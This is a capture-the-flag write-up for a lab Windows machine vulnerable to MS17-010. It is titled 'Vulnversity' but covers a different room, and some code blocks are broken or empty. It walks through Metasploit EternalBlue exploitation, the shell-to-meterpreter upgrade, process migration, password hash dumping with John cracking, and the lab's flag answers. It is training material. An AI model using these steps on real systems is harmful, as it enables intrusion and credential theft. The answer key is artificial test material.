# Module: Vulnversity

Author: Jackson Warren  
Date: August 30, 2022  

## Recon

Target IP = 10.10.132.200

### Nmap Scan
`$ nmap -sV -sC --script vuln -oN scans/nmap-10.10.132.200.out 10.10.132.200 -Pn`


How many ports are open with a port number under 1000?  
Answer: **3**

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)  
Answer: **MS17-010** - Google Eternal Blue Exploit

## Gain Access

Start Metasploit  

Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)  
Answer: **exploit/windows/smb/ms17_010_eternalblue** -- search msfconsole for MS17-010


Show options and set the one required value. What is the name of this value? (All caps for submission)  

`use 0`  
`options`

Answer: **RHOSTS**

I also had to set LHOSTS to my tun0 IP

## Escalate

If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
Answer: **post/multi/manage/shell_to_meterpreter**  

Select this (use MODULE_PATH). Show options, what option are we required to change?  

`use 0`
`options`

Answer: **SESSION**

Set the required option, you may need to list all of the sessions to find your target here.  
`session -l` - List sessions
`set SESSION 1` - Set session




List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

 1288  692   spoolsv.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\spo
                                                                   olsv.exe
spoolsv.exe is great because it's the printer system and it always works with the architecture of the system, it's very stable, and if it does die you can easily restart it.  

## Cracking

Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

```

Answer: **Jon**

Copy this password hash to a file and research how to crack it. What is the cracked password?  
```
Blue git:(main) âœ— john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status

## Find Flags!

Flag1? This flag can be found at the system root.  
```
cd /  
ls  
cat flag1.txt  
```
Answer: **access_the_machine**

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.  

```
meterpreter > search / -f flag2.txt
Found 1 result...

```

I had to cd through each directory until I got to config before I could cat the file, for some reason...

Answer: **flag{sam_database_elevated_access}**

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.  

`cd C:\Users\Jon\Documents`
`cat flag3.txt`

Answer: **flag{admin_documents_can_be_valuable}**
